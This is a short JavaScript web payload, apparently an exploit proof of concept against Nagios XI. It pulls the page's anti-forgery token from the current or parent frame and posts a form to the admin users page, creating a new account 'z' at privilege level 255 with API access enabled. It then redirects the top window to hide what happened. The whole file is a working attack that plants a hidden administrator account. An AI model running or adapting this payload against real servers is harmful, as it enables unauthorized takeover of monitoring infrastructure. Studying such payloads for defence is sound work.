var user = 'z';
var pass = 'z';
var email = 'z@z.z';
var fullname = "z";
var nsp = window.nsp_str || window.top.nsp_str; // we might be inside the iframe
fetch('/nagiosxi/admin/users.php?users&edit=1', {
  method: 'post',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
  },
  body: `update=1&nsp=${nsp}&users=1&user_id%5B%5D=0&username=${user}&password1=${pass}&name=${fullname}&email=${email}&phone=&add_contact=on&enable_notifications=on&enabled=on&language=en_US&defaultDateFormat=1&defaultNumberFormat=1&defaultWeekFormat=0&auth_type=local&ad_username=&dn=&level=255&api_enabled=on&ccm_access=0&updateButton=Add+User`,
})
// Go somewhere else so we don't just show a blank sshterm page?
window.top.location = "http://local-xi/nagiosxi/admin"